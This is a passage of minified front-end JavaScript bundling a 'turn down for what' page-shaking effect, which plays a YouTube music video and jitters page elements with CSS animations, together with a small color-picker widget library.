window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this).turnDownForWhat=t()}((function(){return function t(e,n,r){function i(a,s){if(!n[a]){if(!e[a]){var u="function"==typeof require&&require;if(!s&&u)return u(a,!0);if(o)return o(a,!0);var f=new Error("Cannot find module '"+a+"'");throw f.code="MODULE_NOT_FOUND",f}var l=n[a]={exports:{}};e[a][0].call(l.exports,(function(t){return i(e[a][1][t]||t)}),l,l.exports,t,e,n,r)}return n[a].exports}for(var o="function"==typeof require&&require,a=0;a<r.length;a++)i(r[a]);return i}({1:[function(t,e,n){e.exports=function(t){var e={};function n(r){if(e[r])return e[r].exports;var i=e[r]={i:r,l:!1,exports:{}};return t[r].call(i.exports,i,i.exports,n),i.l=!0,i.exports}return n.m=t,n.c=e,n.d=function(t,e,r){n.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:r})},n.r=function(t){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},n.t=function(t,e){if(1&e&&(t=n(t)),8&e)return t;if(4&e&&"object"==typeof t&&t&&t.__esModule)return t;var r=Object.create(null);if(n.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var i in t)n.d(r,i,function(e){return t[e]}.bind(null,i));return r},n.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return n.d(e,"a",e),e},n.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},n.p="",n(n.s=0)}([function(t,e,n){const r=n(1),i=n(2),o=n(3),{onPlayerReady:a,onPlayerStateChange:s}=n(4),{addCurrStyles:u,getCurrClass:f,removeCurrStyles:l}=n(5);t.exports=(t=["*"],e={jitterAmount:10,maxNodes:1e3,noDelay:!1,numTurntAnimations:10,numKeyframes:10})=>{r(),function(t,{jitterAmount:e,maxNodes:n,noDelay:r,numKeyframes:c,numTurntAnimations:h}){this.firstAddition=!0,this.player=null,this.turndownAt=20,this.turntDown=!1,this.affectedNodes=t,this.jitterAmount=e,this.maxNodes=n,this.noDelay=r,this.numKeyframes=c,this.numTurntAnimations=h,this.animationCSS={tdfw_intro:"tdfwIntro 1s infinite ease-in-out",turntDown:()=>`turntDown${~~(Math.random()*this.numTurntAnimations)} 5s infinite ease-in-out`},this.onPlayerReady=a,this.onPlayerStateChange=s,this.addCurrStyles=u,this.getCurrClass=f,this.removeCurrStyles=l,(()=>{void 0===window.tdfw_TDFW&&(window.tdfw_TDFW=!0,i.call(this),o.call(this))})()}(t,{jitterAmount:e.jitterAmount||10,maxNodes:e.maxNodes||1e3,noDelay:e.noDelay||!1,numTurntAnimations:e.numTurntAnimations||10,numKeyframes:e.numKeyframes||10})}},function(t,e){t.exports=function(){this.lastTime=0;const t=["ms","moz","webkit","o"];for(let e=0;e<t.length&&!window.requestAnimationFrame;++e)window.requestAnimationFrame=window[`${t[e]}RequestAnimationFrame`],window.cancelAnimationFrame=window[`${t[e]}CancelAnimationFrame`]||window[`${t[e]}CancelRequestAnimationFrame`];window.requestAnimationFrame||(window.requestAnimationFrame=(t,e)=>{const n=(new Date).getTime(),r=Math.max(0,16-(n-this.lastTime)),i=window.setTimeout((function(){t()}),r);return this.lastTime=n+r,i}),window.cancelAnimationFrame||(window.cancelAnimationFrame=t=>clearTimeout(t))}},function(t,e){t.exports=function(){const t=document.createElement("div");t.style.position="fixed",t.style.zIndex=5e3,t.style.right=0,t.style.top=0,t.style.opacity=.2;const e=document.createElement("div");e.id="tdfw",t.appendChild(e),document.body.appendChild(t),t.onmouseover=function(){t.style.opacity=1},t.onmouseout=function(){t.style.opacity=.2},t.style.webkitTransition="opacity 0.3s ease-in-out",t.style.transition="opacity 0.3s ease-in-out";const n=document.createElement("script");n.src="https://www.youtube.com/iframe_api",document.body.appendChild(n),window.onYouTubeIframeAPIReady=()=>{this.player=new YT.Player("tdfw",{height:"200",width:"305",videoId:"HMUDVMiITOU",playerVars:{start:1},events:{onReady:this.onPlayerReady,onStateChange:this.onPlayerStateChange}})}}},function(t,e){t.exports=function(){let t=[],e=new Array(this.numTurntAnimations).fill("");for(let n=0;n<=this.numKeyframes;n++){const r=n/this.numKeyframes*100+"%",i=~~((Math.random()-.5)*this.jitterAmount)||1,o=~~((Math.random()-.5)*this.jitterAmount)||1,a=`-webkit-transform: translate(${i}px, ${o}px); transform: translate(${i}px, ${o}px);`;t.push(`${r} { ${a} }`);for(let t=0;t<this.numTurntAnimations;t++){const i=~~((Math.random()-.5)*this.jitterAmount)||1,o=~~((Math.random()-.5)*this.jitterAmount)||1,a=~~(n/this.numKeyframes*360),s=String.fromCharCode(88+~~(2*Math.random())),u=`-webkit-transform: translate(${i}px, ${o}px) rotate${s}(${a}deg); transform: translate(${i}px, ${o}px) rotate${s}(${a}deg);`;e[t]+="100%"===r?`${r} { -webkit-transform: none; transform: none; }`:`${r} { ${u} }`}}let n=`@-webkit-keyframes tdfwIntro { ${t.join("\n")} } @keyframes tdfwIntro { ${t.join("\n")} }`;e.forEach(((t,r)=>{n+=`@-webkit-keyframes turntDown${r} { ${e[r]} } @keyframes turntDown${r} { ${e[r]} }`}));const r=document.createElement("style");r.textContent=n,document.body.appendChild(r)}},function(t,e){t.exports={onPlayerReady:function(t){console.log("GET READY TO TURN DOWN FOR WHAT"),t.target.playVideo(),requestAnimationFrame(function t(){if(this.turntDown)return!1;requestAnimationFrame(t.bind(this)),this.player.getCurrentTime()>this.turndownAt&&(this.turntDown=!0,this.removeCurrStyles(),this.addCurrStyles.call(this,this.affectedNodes,this.noDelay))}.bind(this))},onPlayerStateChange:function(t){1===t.data?this.addCurrStyles.call(this,this.affectedNodes,this.noDelay):2!==t.data&&0!==t.data||this.removeCurrStyles()}}},function(t,e){t.exports={addCurrStyles:function(t,e){const n=this.getCurrClass.call(this);t=Array.prototype.slice.call(document.querySelectorAll(t.join(", ")));const r=this.maxNodes<t.length?this.maxNodes:t.length;for(let i=0;i<r;i++){t[i].classList.add(n);let r=~~(1e3*Math.random())/1e3+"ms";e?r="":this.firstAddition&&(r=~~(10*Math.random())+"s");let o=this.animationCSS[n];"function"==typeof o&&(o=o()),t[i].style.webkitAnimation=`${o} ${r}`,t[i].style.animation=`${o} ${r}`}this.firstAddition=!1},getCurrClass:function(){return this.player.getCurrentTime()>this.turndownAt?"turntDown":"tdfw_intro"},removeCurrStyles:function(){document.querySelectorAll("*").forEach((t=>{["tdfw_intro","turntDown"].forEach((e=>{t.classList.remove(e),t.style.webkitAnimation="",t.style.animation=""}))}))}}}])},{}]},{},[1])(1)})),function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):(t="undefined"!=typeof globalThis?globalThis:t||self).CP=e()}(this,(function(){"use strict";var t=function(t,e){return-1!==e.indexOf(t)},e=function(t){return Array.isArray(t)},n=function(t){return"function"==typeof t},r=function(t,e){return t&&a(e)&&t instanceof e},i=function(t){return"number"==typeof t},o=function(t,e){return void 0===e&&(e=!0),"object"==typeof t&&(!e||r(t,Object))},a=function(t){return function(t){return void 0!==t}(t)&&!function(t){return null===t}(t)},s=function(t){return"string"==typeof t},u=function(t){return t.length},f=function(t,e){return a(e[0])&&t<e[0]?e[0]:a(e[1])&&t>e[1]?e[1]:t},l=function(t,e){return void 0===e&&(e=10),e?parseInt(t,e):parseFloat(t)},c=function(t){return i(t)?Math.round(t):null},h=function(t,e){return void 0===e&&(e=10),i(t)?t.toString(e):""+t},d=function n(){for(var r=arguments.length,i=Array(r),s=0;s<r;s++)i[s]=arguments[s];for(var f=i.shift(),l=0,c=u(i);l<c;++l)for(var h in i[l])if(a(f[h]))if(e(f[h])&&e(i[l][h])){f[h]=[].concat(f[h]);for(var d=0,m=u(i[l][h]);d<m;++d)t(i[l][h][d],f[h])||f[h].push(i[l][h][d])}else o(f[h])&&o(i[l][h])?f[h]=n({},f[h],i[l][h]):f[h]=i[l][h];else f[h]=i[l][h];return f},m=function t(n){if(e(n))return n.map((function(e){return t(n)}));if(o(n)){for(var r in n)n[r]=t(n[r]);return n}return!1===n?"false":null===n?"null":!0===n?"true":""+n},p=document,g=window,b=p.body,y=p.documentElement,v=function(t,e){return e?t.closest(e)||null:t.parentNode||null},w=function(t,e){return t.removeAttribute(e),t},x=function(t,e,n){return!0===n&&(n=e),t.setAttribute(e,m(n)),t},_=function(t,e){return t.append(e),e},A=function(t,e,n){return t=s(t)?p.createElement(t):t,o(e)&&(n=e,e=!1),s(e)&&k(t,e),o(n)&&function(t,e){var n;for(var r in e)(n=e[r])||""===n||0===n?x(t,r,n):w(t,r)}(t,n),t},k=function(t,e,n){if(void 0===n&&(n=!0),null===e)return t;return function(t,e){return"innerHTML"in t}(t)&&(t.innerHTML=n?e.trim():e),t},C=function(t,e,n){return i(n)&&(n+="px"),t.style[(r=e,r.replace(/[-_.](\w)/g,(function(t,e){return function(t){return t.toUpperCase()}(e)})))]=m(n),t;var r},S=function(t){return t&&t.preventDefault()},T=function(t,e,n){t.forEach((function(t){return function(t,e,n){e.removeEventListener(t,n)}(t,e,n)}))},$=function(t,e,n,r){void 0===r&&(r=!1),t.forEach((function(t){return function(t,e,n,r){void 0===r&&(r=!1),e.addEventListener(t,n,r)}(t,e,n,r)}))},E=function(t,e){var n=t.touches,r=n?n[0].clientX:t.clientX,i=n?n[0].clientY:t.clientY;if(e){var o=F(e);return[r-o[0],i-o[1],o[0],o[1]]}return[r,i]},F=function(t){var e,n,r,i,o,a,s;return function(t){return t===g}(t)?(i=t.pageXOffset||y.scrollLeft||b.scrollLeft,o=t.pageYOffset||y.scrollTop||b.scrollTop,r=t.innerWidth,e=t.innerHeight):(i=(n=t.getBoundingClientRect()).left,o=n.top,r=n.width,e=n.height,a=n.right,s=n.bottom),[i,o,r,e,a,s]};const P="HEX",R=["touchstart","mousedown"],H=["touchmove","mousemove"],M=["orientationchange","resize"],O=["touchend","mouseup"];let D=g.setTimeout;function N(t,e){if(t===e)return t;for(;(t=t.parentElement)&&t!==e;);return t}function L(t){let e,n,r,i,o,s,u,f,l=+t[0],h=+t[1],d=+t[2];switch(i=Math.floor(6*l),o=6*l-i,s=d*(1-h),u=d*(1-o*h),f=d*(1-(1-o)*h),i=i||0,u=u||0,f=f||0,i%6){case 0:e=d,n=f,r=s;break;case 1:e=u,n=d,r=s;break;case 2:e=s,n=d,r=f;break;case 3:e=s,n=u,r=d;break;case 4:e=f,n=s,r=d;break;case 5:e=d,n=s,r=u}return[c(255*e),c(255*n),c(255*r),a(t[3])?+t[3]:1]}function q(t){let e,n,r=+t[0]/255,i=+t[1]/255,o=+t[2]/255,s=Math.max(r,i,o),u=Math.min(r,i,o),f=s,l=s-u;if(n=0===s?0:l/s,s===u)e=0;else{switch(s){case r:e=(i-o)/l+(i<o?6:0);break;case i:e=(o-r)/l+2;break;case o:e=(r-i)/l+4}e/=6}return[e,n,f,a(t[3])?+t[3]:1]}function I(t,e={}){if(!t)return;if(t.CP)return t.CP;const i=this;if(!r(i,I))return new I(t,e);var l;i.state=e=d(I.state,s(e)?{color:e}:e||{}),I.instances[t.id||t.name||(l=I.instances,u(function(t){return Object.keys(t)}(l)))]=i,t.CP=i;let{fire:c,hooks:h}=function(t){var e={};return t.hooks=e,t.fire=function(n,r){return a(e[n])?(e[n].forEach((function(e){return e.apply(t,r)})),t):t},t.off=function(n,r){if(!a(n))return e={},t;if(a(e[n]))if(a(r)){for(var i=0,o=e[n].length;i<o;++i)if(r===e[n][i]){e[n].splice(i,1);break}0===j&&delete e[n]}else delete e[n];return t},t.on=function(n,r){return a(e[n])||(e[n]=[]),a(r)&&e[n].push(r),t},t}(i);function m(){return t.value?I[n(I[e.color])?e.color:P](t.value||""):[0,0,0,1]}let w,x,k,W,z=e.class+"__",K=()=>t.disabled,U=()=>t.readOnly,Y=m(),V=q(Y),X=A("div",{class:z+"dialog",role:"dialog"}),B=A("div",{class:z+"controls"}),G=z+"control",Z=z+"cursor",Q=A("div",{class:G+" "+G+"--s/v"}),J=A("div",{class:G+" "+G+"--h"}),tt=A("div",{class:G+" "+G+"--a"}),et=A("div"),nt=A("div"),rt=A("div"),it=A("i",{class:Z+" "+Z+"--s/v"}),ot=A("div"),at=A("i",{class:Z+" "+Z+"--h"}),st=A("div"),ut=A("div"),ft=A("i",{class:Z+" "+Z+"--a"}),lt=0,ct=0,ht=0,dt=0,mt=0,pt=0;function gt(e){if(h.focus)c("focus",Y);else{let n=e.target;t===N(n,t)?!v(X)&&w():x()}}return _(X,B),_(B,Q),_(B,J),_(B,tt),_(Q,et),_(Q,nt),_(Q,rt),_(Q,it),_(J,ot),_(J,at),_(tt,st),_(tt,ut),_(tt,ft),function r(s,u){function l(t){i.current=tt,ht=pt=1,j(t),S(t)}function d(t){i.current=J,ct=mt=1,j(t),S(t)}function A(t){i.current=Q,lt=dt=1,j(t),S(t)}function j(t){dt&&function(t){let e=E(t,Q),n=f(e[0],[0,wt]),r=f(e[1],[0,yt]);V[1]=1-(wt-n)/wt,V[2]=(yt-r)/yt,B()}(t),mt&&function(t){V[0]=(_t-f(E(t,J)[1],[0,_t]))/_t,B()}(t),pt&&function(t){V[3]=(kt-f(E(t,tt)[1],[0,kt]))/kt,B()}(t),Y=L(V),(dt||mt||pt)&&(c(lt||ct||ht?"start":"drag",Y),c("change",Y)),lt=ct=ht=0}function B(){!function(t){a(t[1])&&C(it,"right",wt-xt/2-wt*+t[1]),a(t[2])&&C(it,"top",yt-vt/2-yt*+t[2]),a(t[0])&&C(at,"top",_t-At/2-_t*+t[0]),a(t[3])&&C(ft,"top",kt-Ct/2-kt*+t[3])}(V);let t=L(V),e=L([V[0],1,1]);C(et,"background-color","rgb("+e[0]+","+e[1]+","+e[2]+")"),C(st,"background-image","linear-gradient(rgb("+t[0]+","+t[1]+","+t[2]+"),transparent)")}function G(e){Y=L(V);let n=e.target,r=t===N(n,t),o=X===N(n,X);i.current=null,r||o?o&&(dt||mt||pt)&&c("stop",Y):h.blur?c("blur",Y):dt||mt||pt||v(X)&&x(),dt=mt=pt=0}V=q(Y=m()),s||(_(u||b,X),i.visible=!0),w=t=>(K()||U()||(r(0,t),c("enter",Y)),i),x=()=>{return K()||U()?i:(v(X)&&(v(t=X),t.remove(),i.current=null,i.visible=!1),T(R,Q,A),T(R,J,d),T(R,tt,l),T(H,p,j),T(O,p,G),T(M,g,W),c("exit",Y));var t},k=e=>{let n=F(y),r=F(t),i=F(g),s=i[3]-y.clientHeight,u=i[2]-n[2],l=F(X),h=l[3],d=l[2],m=r[0]+i[0],p=r[1]+i[1]+r[3];if(o(e))a(e[0])&&(m=e[0]),a(e[1])&&(p=e[1]);else{let t=i[0],e=i[1],n=i[0]+i[2]-d-u,r=i[1]+i[3]-h-s;m=f(m,[t,n])>>0,p=f(p,[e,r])>>0}return C(X,"left",m),C(X,"top",p),c("fit",Y)},W=()=>k();let Z=F(Q),nt=F(it),rt=F(J),ot=F(at),ut=F(tt),bt=F(ft),yt=Z[3],vt=nt[3],wt=Z[2],xt=nt[2],_t=rt[3],At=ot[3],kt=ut[3],Ct=bt[3];var St;s?($(R,t,gt),D((()=>{c("change",Y)}),1)):($(R,Q,A),$(R,J,d),$(R,tt,l),$(H,p,j),$(O,p,G),$(M,g,W),k()),B(),i.color=(t,r,i,o)=>I[n(I[e.color])?e.color:P]([t,r,i,o]),i.current=null,i.enter=w,i.exit=x,i.fit=k,i.get=()=>m(),i.pop=()=>{return t.CP?(delete t.CP,e=z+"source",t.classList.remove(e),T(R,t,gt),x(),c("pop",Y)):i;var e},i.set=(t,e,n,r)=>(i._set(t,e,n,r),c("change",[t,e,n,r])),i.self=X,i._set=(t,e,n,r)=>(V=q([t,e,n,r]),B(),i),St=z+"source",t.classList.add(St)}(1),i.source=t,i.visible=!1,i}return I.HEX=t=>{if(s(t)){let e=u(t=t.trim());if(4!==e&&7!==e||"#"!==t[0]){if((5===e||9===e)&&"#"===t[0]&&/^#([a-f\d]{3,4}){1,2}$/i.test(t))return 5===e?[l(t[1]+t[1],16),l(t[2]+t[2],16),l(t[3]+t[3],16),l(t[4]+t[4],16)/255]:[l(t[1]+t[2],16),l(t[3]+t[4],16),l(t[5]+t[6],16),l(t[7]+t[8],16)/255]}else if(/^#([a-f\d]{3}){1,2}$/i.test(t))return 4===e?[l(t[1]+t[1],16),l(t[2]+t[2],16),l(t[3]+t[3],16),1]:[l(t[1]+t[2],16),l(t[3]+t[4],16),l(t[5]+t[6],16),1];return[0,0,0,1]}return"#"+("000000"+h(+t[2]|+t[1]<<8|+t[0]<<16,16)).slice(-6)+(a(t[3])&&t[3]<1?h(c(255*t[3])+65536,16).substr(-2):"")},I.instances={},I.state={class:"color-picker",color:P},I.version="2.4.2",I}));